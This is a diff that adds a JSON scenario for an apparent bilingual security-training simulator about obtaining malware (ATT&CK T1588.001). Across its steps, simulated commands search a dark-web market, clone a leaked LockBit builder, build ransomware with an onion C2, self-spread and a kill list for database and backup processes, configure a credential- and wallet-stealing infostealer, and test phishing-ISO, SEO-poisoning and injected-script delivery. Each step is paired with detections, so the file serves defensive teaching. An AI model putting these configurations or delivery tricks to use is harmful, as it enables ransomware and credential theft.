@@ -1,0 +1,185 @@
+{
+  "id": "T1588.001",
+  "title": "악성코드 획득 시뮬레이션",
+  "titleEn": "Obtain Malware Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 악성코드 구매", "labelEn": "🔍 Malware Purchase", "steps": [0, 1] },
+    { "label": "⚡ 커스터마이징", "labelEn": "⚡ Customization", "steps": [2, 3] },
+    { "label": "✅ 배포 테스트", "labelEn": "✅ Deployment Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "market", "label": "Dark Web Market", "x": 200, "y": 30 },
+    { "id": "builder", "label": "Malware Builder", "x": 200, "y": 90 },
+    { "id": "payload", "label": "Custom Payload", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim PC", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "market", "minStep": 0 },
+    { "from": "market", "to": "builder", "minStep": 1 },
+    { "from": "builder", "to": "payload", "minStep": 2 },
+    { "from": "payload", "to": "victim", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "MaaS Panel", "icon": "🌐", "alert": true },
+    { "name": "builder.exe", "icon": "⚙️" },
+    { "name": "payload_v2.exe", "icon": "📦" }
+  ],
+  "steps": [
+    {
+      "cmd": "curl -s 'https://darkmarket[.]onion/api/malware?category=ransomware&sort=rating' -H 'Auth: buyer_tok3n' | jq '.results[:3]'",
+      "out": "[\n  {\n    \"name\": \"LockBit 4.0 Builder (Leaked)\",\n    \"price\": \"FREE (leaked source)\",\n    \"rating\": \"4.7/5\",\n    \"features\": [\"AES-256 + RSA-2048\", \"ESXi support\", \"Self-propagation\", \"Builder included\"]\n  },\n  {\n    \"name\": \"BlackCat/ALPHV RaaS Affiliate\",\n    \"price\": \"80/20 profit split\",\n    \"rating\": \"4.9/5\",\n    \"features\": [\"Rust-based\", \"Cross-platform\", \"Data exfil\", \"DLS portal\"]\n  },\n  {\n    \"name\": \"Raccoon Stealer v3\",\n    \"price\": \"$275/month\",\n    \"rating\": \"4.6/5\",\n    \"features\": [\"Browser creds\", \"Crypto wallets\", \"Discord tokens\", \"Telegram bot C2\"]\n  }\n]",
+      "def": "[Dark Web Intel] Malware marketplace listings monitored — ransomware and stealer offerings detected",
+      "defAction": "Source: Dark web monitoring feed\nTarget: Multiple MaaS listings\nAction: IOC extraction from samples, YARA rules updated",
+      "desc": "다크웹 마켓플레이스에서 랜섬웨어, 인포스틸러 등 MaaS(Malware-as-a-Service) 상품을 검색합니다.",
+      "descEn": "Searching dark web marketplace for ransomware, infostealers, and other MaaS offerings.",
+      "stepTitle": "MaaS 마켓 검색",
+      "stepTitleEn": "MaaS Marketplace Search",
+      "feynman": "무기 암시장에서 '기성품 무기'를 쇼핑하는 것과 같습니다. 랜섬웨어는 '수익 분배' 방식으로, 인포스틸러는 '월정액' 방식으로 판매됩니다. 공격자는 프로그래밍을 몰라도 이미 만들어진 악성코드를 구매하여 바로 사용할 수 있습니다.",
+      "feynmanEn": "Like shopping for ready-made weapons at a black market. Ransomware is sold as profit-sharing, infostealers as monthly subscriptions. Attackers can buy and use pre-made malware without programming knowledge.",
+      "expert": "MaaS 생태계는 RaaS(Ransomware-as-a-Service), Stealer-as-a-Service 등으로 세분화됩니다. LockBit 4.0 빌더 유출로 진입 장벽이 크게 낮아졌습니다.",
+      "expertEn": "The MaaS ecosystem is segmented into RaaS, Stealer-as-a-Service, etc. LockBit 4.0 builder leak significantly lowered the entry barrier.",
+      "defTooltip": "🔗 다크웹 인텔: MaaS 마켓 랜섬웨어/스틸러 모니터링",
+      "defTooltipEn": "🔗 Dark Web Intel: MaaS market ransomware/stealer monitoring",
+      "hackerLog": {
+        "title": "maas_search.log",
+        "lines": [
+          { "log": "LockBit 4.0: FREE (leaked builder)", "desc": "💡 유출된 빌더 — 누구나 커스텀 랜섬웨어 생성 가능" },
+          { "log": "BlackCat: 80/20 profit split", "desc": "💡 RaaS 어필리에이트 — 수익의 80%를 공격자에게" },
+          { "log": "Raccoon v3: $275/month", "desc": "💡 월정액 인포스틸러 — 구독형 MaaS 모델" }
+        ]
+      },
+      "terms": [
+        { "name": "MaaS", "desc": "Malware-as-a-Service. 악성코드를 서비스 형태로 판매하는 사이버범죄 비즈니스 모델." },
+        { "name": "RaaS", "desc": "Ransomware-as-a-Service. 랜섬웨어를 수익 분배 방식으로 제공하는 어필리에이트 프로그램." }
+      ]
+    },
+    {
+      "cmd": "git clone https://leaked-repo[.]onion/lockbit4-builder.git && cd lockbit4-builder && python3 builder.py --help",
+      "out": "Cloning into 'lockbit4-builder'...\n[+] Clone complete (148 files, 23.4 MB)\n\nLockBit 4.0 Ransomware Builder (Leaked)\n========================================\nUsage: python3 builder.py [OPTIONS]\n\nOptions:\n  --target-os    windows|linux|esxi (default: windows)\n  --encryption   aes256-rsa2048|chacha20-rsa4096\n  --extensions   File extensions to encrypt (default: all)\n  --exclude      Directories to skip (e.g., Windows, Program Files)\n  --ransom-note  Custom ransom note text file\n  --c2           C2 server URL for key exchange\n  --tor-portal   Onion address for victim portal\n  --self-spread  Enable SMB/RDP lateral movement\n  --kill-proc    Processes to kill before encryption\n  --output       Output filename",
+      "def": "[EDR] Known ransomware builder tool downloaded — LockBit 4.0 source code detected",
+      "defAction": "Source: Attacker workstation\nTarget: lockbit4-builder repository\nAction: YARA signatures updated, builder hash added to blocklist",
+      "desc": "유출된 LockBit 4.0 빌더를 다운로드합니다. 이 빌더로 커스텀 랜섬웨어를 생성할 수 있습니다.",
+      "descEn": "Downloading the leaked LockBit 4.0 builder. This builder can generate custom ransomware.",
+      "stepTitle": "랜섬웨어 빌더 다운로드",
+      "stepTitleEn": "Ransomware Builder Download",
+      "feynman": "'무기 조립 키트'를 다운로드하는 것입니다. LockBit 4.0의 소스코드가 유출되면서, 누구나 이 빌더를 사용해 자신만의 랜섬웨어를 만들 수 있게 되었습니다. 마치 레고 조립 설명서처럼 옵션을 선택하면 맞춤형 악성코드가 생성됩니다.",
+      "feynmanEn": "Like downloading a 'weapon assembly kit'. With LockBit 4.0 source code leaked, anyone can use this builder to create their own ransomware. Like a LEGO instruction manual — select options and custom malware is generated.",
+      "expert": "LockBit 4.0 빌더는 ChaCha20-RSA4096 옵션, ESXi 지원, SMB/RDP 자가 전파 기능을 포함합니다. 유출된 빌더는 원본과 동일한 암호화 품질을 제공합니다.",
+      "expertEn": "LockBit 4.0 builder includes ChaCha20-RSA4096 option, ESXi support, and SMB/RDP self-propagation. The leaked builder provides identical encryption quality to the original.",
+      "defTooltip": "🔗 EDR: LockBit 4.0 빌더 소스코드 다운로드 감지",
+      "defTooltipEn": "🔗 EDR: LockBit 4.0 builder source code download detected",
+      "hackerLog": {
+        "title": "builder_download.log",
+        "lines": [
+          { "log": "Builder: LockBit 4.0 (leaked)", "desc": "💡 유출된 빌더 — 무료로 사용 가능" },
+          { "log": "Options: OS, encryption, C2, spread", "desc": "💡 다양한 커스터마이징 옵션 제공" },
+          { "log": "Files: 148 (23.4 MB)", "desc": "💡 전체 소스코드 포함 — 수정 및 재컴파일 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "빌더", "desc": "악성코드를 자동 생성하는 도구. 옵션을 선택하면 커스텀 페이로드를 빌드." },
+        { "name": "ChaCha20", "desc": "고속 스트림 암호화 알고리즘. 랜섬웨어에서 파일 암호화에 사용. AES보다 소프트웨어 구현이 빠름." }
+      ]
+    },
+    {
+      "cmd": "python3 builder.py --target-os windows --encryption chacha20-rsa4096 --c2 'https://c2.darkdomain[.]onion/gate' --tor-portal 'http://lockbit4xxxx[.]onion' --self-spread --kill-proc 'sqlservr.exe,oracle.exe,vmms.exe,veeam.exe' --ransom-note ransom_note.txt --output {companyName}_locker.exe",
+      "out": "[*] LockBit 4.0 Builder — Generating payload\n[*] Target OS: Windows (x64)\n[*] Encryption: ChaCha20 + RSA-4096\n[*] C2 Server: https://c2.darkdomain[.]onion/gate\n[*] Victim Portal: http://lockbit4xxxx[.]onion\n[*] Self-Spread: Enabled (SMB + RDP brute)\n[*] Kill Processes: sqlservr.exe, oracle.exe, vmms.exe, veeam.exe\n[*] Ransom Note: ransom_note.txt loaded\n[+] RSA-4096 keypair generated\n[+] Payload compiled: {companyName}_locker.exe (842 KB)\n[+] SHA256: a1b2c3d4e5f6...\n[+] VT Detection: 4/68 (5.8%)",
+      "def": "[Sandbox] Custom LockBit variant generated — kill list targets backup and database processes",
+      "defAction": "Source: Builder output\nTarget: {companyName}_locker.exe\nAction: Sample submitted to threat intel sharing, YARA rule for variant created",
+      "desc": "빌더로 대상 조직에 맞춤화된 랜섬웨어를 생성합니다. 데이터베이스와 백업 프로세스를 우선 종료하도록 설정합니다.",
+      "descEn": "Generating ransomware customized for the target organization. Configured to terminate database and backup processes first.",
+      "stepTitle": "커스텀 랜섬웨어 빌드",
+      "stepTitleEn": "Custom Ransomware Build",
+      "feynman": "조립 키트로 '맞춤형 무기'를 만드는 것입니다. 대상 회사가 SQL Server와 Oracle을 사용하는 것을 파악했으므로, 이 프로그램들을 먼저 종료하고 파일을 암호화하도록 설정합니다. Veeam(백업 소프트웨어)도 종료하여 복구를 어렵게 만듭니다.",
+      "feynmanEn": "Like building a custom weapon from an assembly kit. Knowing the target uses SQL Server and Oracle, the ransomware is configured to terminate these programs first before encrypting files. Veeam (backup software) is also killed to hinder recovery.",
+      "expert": "Kill list에 sqlservr.exe, oracle.exe를 포함하면 데이터베이스 파일 잠금이 해제되어 암호화가 가능합니다. veeam.exe 종료는 VSS 스냅샷과 백업 차단을 목표로 합니다.",
+      "expertEn": "Including sqlservr.exe, oracle.exe in kill list releases database file locks for encryption. Killing veeam.exe targets VSS snapshot and backup disruption.",
+      "defTooltip": "🔗 샌드박스: 백업/DB 프로세스 킬리스트 포함 LockBit 변종 감지",
+      "defTooltipEn": "🔗 Sandbox: LockBit variant with backup/DB process kill list detected",
+      "hackerLog": {
+        "title": "custom_build.log",
+        "lines": [
+          { "log": "Encryption: ChaCha20 + RSA-4096", "desc": "💡 복호화 불가능한 암호화 조합 — 키 없이 복구 불가" },
+          { "log": "Kill: SQL, Oracle, Veeam", "desc": "💡 DB 잠금 해제 + 백업 차단 — 피해 극대화" },
+          { "log": "VT: 4/68 (5.8%)", "desc": "💡 빌더 수정으로 대부분의 AV 우회" }
+        ]
+      },
+      "terms": [
+        { "name": "Kill List", "desc": "랜섬웨어가 암호화 전 종료하는 프로세스 목록. DB, 백업 소프트웨어를 포함하여 파일 잠금 해제 및 복구 방해." },
+        { "name": "RSA-4096", "desc": "4096비트 RSA 비대칭 암호화. 파일 암호화 키를 보호하며, 개인키 없이는 복호화 불가능." }
+      ]
+    },
+    {
+      "cmd": "python3 -c \"\nprint('=== Raccoon Stealer v3 — Configuration ===')\nprint('Subscription: Active (expires 2026-03-31)')\nprint('C2: Telegram Bot (@raccoon_c2_bot)')\nprint('Targets:')\nprint('  Browsers: Chrome, Firefox, Edge (cookies, passwords, autofill)')\nprint('  Crypto: MetaMask, Phantom, Electrum, Exodus')\nprint('  Apps: Discord, Telegram, Steam')\nprint('  Files: *.txt, *.doc, *.pdf, *.key, *.pem (Desktop/Documents)')\nprint('Exfil: Telegram Bot API (encrypted ZIP)')\nprint('Loader: Yes (can deploy 2nd stage payload)')\nprint('\\nPayload: raccoon_loader.exe (312 KB)')\nprint('VT Detection: 6/68 (8.8%)')\n\"",
+      "out": "=== Raccoon Stealer v3 — Configuration ===\nSubscription: Active (expires 2026-03-31)\nC2: Telegram Bot (@raccoon_c2_bot)\nTargets:\n  Browsers: Chrome, Firefox, Edge (cookies, passwords, autofill)\n  Crypto: MetaMask, Phantom, Electrum, Exodus\n  Apps: Discord, Telegram, Steam\n  Files: *.txt, *.doc, *.pdf, *.key, *.pem (Desktop/Documents)\nExfil: Telegram Bot API (encrypted ZIP)\nLoader: Yes (can deploy 2nd stage payload)\n\nPayload: raccoon_loader.exe (312 KB)\nVT Detection: 6/68 (8.8%)",
+      "def": "[Threat Intel] Raccoon Stealer v3 subscription activated — Telegram Bot C2 configuration detected",
+      "defAction": "Source: MaaS subscription\nTarget: Raccoon Stealer v3 panel\nAction: Telegram bot monitored, stealer IOCs shared with community",
+      "desc": "월정액 인포스틸러 Raccoon v3를 구독하고 설정합니다. 브라우저 자격증명, 암호화폐 지갑, 파일을 탈취합니다.",
+      "descEn": "Subscribing to monthly infostealer Raccoon v3. Configured to steal browser credentials, crypto wallets, and files.",
+      "stepTitle": "인포스틸러 구독 설정",
+      "stepTitleEn": "Infostealer Subscription Setup",
+      "feynman": "월정액 '도청 서비스'를 구독하는 것입니다. Raccoon Stealer는 월 $275에 브라우저에 저장된 비밀번호, 암호화폐 지갑, Discord 토큰 등을 자동으로 훔치는 프로그램입니다. 훔친 정보는 Telegram 봇으로 공격자에게 전송됩니다.",
+      "feynmanEn": "Like subscribing to a monthly wiretapping service. Raccoon Stealer automatically steals browser passwords, crypto wallets, Discord tokens for $275/month. Stolen data is sent to the attacker via Telegram bot.",
+      "expert": "Raccoon v3는 Telegram Bot API를 C2로 사용하여 인프라 구축 비용을 최소화합니다. 로더 기능으로 2단계 페이로드(랜섬웨어 등) 배포도 가능합니다.",
+      "expertEn": "Raccoon v3 uses Telegram Bot API as C2 to minimize infrastructure costs. Loader capability enables 2nd stage payload (ransomware etc.) deployment.",
+      "defTooltip": "🔗 위협 인텔: Raccoon v3 구독 활성화 — Telegram C2 모니터링",
+      "defTooltipEn": "🔗 Threat Intel: Raccoon v3 subscription activated — Telegram C2 monitoring",
+      "hackerLog": {
+        "title": "stealer_config.log",
+        "lines": [
+          { "log": "Stealer: Raccoon v3 ($275/mo)", "desc": "💡 구독형 인포스틸러 — 프로그래밍 지식 불필요" },
+          { "log": "C2: Telegram Bot API", "desc": "💡 합법 메신저를 C2로 악용 — 차단 어려움" },
+          { "log": "Loader: 2nd stage capable", "desc": "💡 스틸러 감염 후 랜섬웨어 추가 배포 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "인포스틸러", "desc": "감염된 시스템에서 자격증명, 쿠키, 암호화폐 지갑 등 민감 정보를 자동 수집하는 악성코드." },
+        { "name": "로더", "desc": "추가 악성코드를 다운로드하여 실행하는 기능. 초기 감염 후 2단계 페이로드 배포에 사용." }
+      ]
+    },
+    {
+      "cmd": "echo '=== Delivery Test ===' && python3 -c \"\nimport hashlib\nprint('[*] Testing payload delivery channels...')\nprint()\nprint('[1] Phishing Email + ISO Attachment')\nprint('    Payload: {companyName}_locker.exe inside invoice.iso')\nprint('    Bypass: ISO mounts directly, bypasses MOTW')\nprint('    Status: ✅ Delivered successfully')\nprint()\nprint('[2] SEO Poisoned Download')\nprint('    URL: software-download[.]com/auditing-tool.exe')\nprint('    Payload: raccoon_loader.exe (disguised)')\nprint('    Status: ✅ Download active')\nprint()\nprint('[3] Compromised Website (Watering Hole)')\nprint('    Target: industry-forum[.]com')\nprint('    Inject: <script src=evil.js> → drive-by download')\nprint('    Status: ✅ JavaScript injected')\nprint()\nprint('[*] All delivery channels operational')\nprint('[*] Campaign ready for launch')\n\"",
+      "out": "=== Delivery Test ===\n[*] Testing payload delivery channels...\n\n[1] Phishing Email + ISO Attachment\n    Payload: {companyName}_locker.exe inside invoice.iso\n    Bypass: ISO mounts directly, bypasses MOTW\n    Status: ✅ Delivered successfully\n\n[2] SEO Poisoned Download\n    URL: software-download[.]com/auditing-tool.exe\n    Payload: raccoon_loader.exe (disguised)\n    Status: ✅ Download active\n\n[3] Compromised Website (Watering Hole)\n    Target: industry-forum[.]com\n    Inject: <script src=evil.js> → drive-by download\n    Status: ✅ JavaScript injected\n\n[*] All delivery channels operational\n[*] Campaign ready for launch",
+      "def": "[SIEM] Multi-channel malware delivery campaign detected — phishing, SEO poisoning, watering hole",
+      "defAction": "Source: Multiple delivery vectors\nTarget: {companyName} employees\nAction: Email gateway updated, URL filtering enhanced, DNS sinkholing activated",
+      "desc": "획득한 악성코드를 다양한 배포 채널(피싱, SEO 포이즈닝, 워터링홀)로 테스트합니다.",
+      "descEn": "Testing obtained malware through various delivery channels (phishing, SEO poisoning, watering hole).",
+      "stepTitle": "악성코드 배포 테스트",
+      "stepTitleEn": "Malware Delivery Test",
+      "feynman": "만든 무기를 다양한 방법으로 '배달'하는 테스트입니다. 이메일 첨부(피싱), 가짜 다운로드 사이트(SEO 포이즈닝), 해킹된 웹사이트(워터링홀) 3가지 경로로 악성코드를 전달합니다. ISO 파일은 Windows의 보안 경고(MOTW)를 우회하는 트릭입니다.",
+      "feynmanEn": "Like testing 'delivery methods' for manufactured weapons. Malware is delivered through 3 channels: email attachment (phishing), fake download site (SEO poisoning), and compromised website (watering hole). ISO files bypass Windows MOTW security warnings.",
+      "expert": "ISO 첨부는 MOTW(Mark of the Web)를 우회하는 대표적 기법입니다. SEO 포이즈닝은 검색 결과를 조작하여 악성 다운로드를 유도합니다. 다채널 배포는 탐지 확률을 분산시킵니다.",
+      "expertEn": "ISO attachment is a classic MOTW bypass technique. SEO poisoning manipulates search results to drive malicious downloads. Multi-channel delivery distributes detection probability.",
+      "defTooltip": "🔗 SIEM: 다채널 악성코드 배포 캠페인 탐지",
+      "defTooltipEn": "🔗 SIEM: Multi-channel malware delivery campaign detected",
+      "hackerLog": {
+        "title": "delivery_test.log",
+        "lines": [
+          { "log": "Channel 1: Phishing + ISO (MOTW bypass)", "desc": "💡 이메일 첨부 — 가장 전통적이지만 효과적인 방법" },
+          { "log": "Channel 2: SEO Poisoning", "desc": "💡 검색 결과 조작 — 사용자가 직접 다운로드 유도" },
+          { "log": "Channel 3: Watering Hole", "desc": "💡 특정 업계 웹사이트 해킹 — 타겟 감염" }
+        ]
+      },
+      "terms": [
+        { "name": "MOTW", "desc": "Mark of the Web. Windows가 인터넷 다운로드 파일에 표시하는 보안 태그. SmartScreen 검사 트리거." },
+        { "name": "워터링홀", "desc": "대상이 자주 방문하는 웹사이트를 해킹하여 악성코드를 삽입하는 표적 공격 기법." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "pid": 1, "name": "init", "children": [
+      { "pid": 1200, "name": "bash", "children": [
+        { "pid": 1201, "name": "curl (dark market)", "children": [] },
+        { "pid": 1205, "name": "git clone (builder)", "children": [] },
+        { "pid": 1210, "name": "builder.py (ransomware)", "children": [
+          { "pid": 1211, "name": "{companyName}_locker.exe", "children": [] }
+        ]},
+        { "pid": 1215, "name": "raccoon_config", "children": [] },
+        { "pid": 1220, "name": "delivery_test", "children": [] }
+      ]}
+    ]}
+  ]
+}
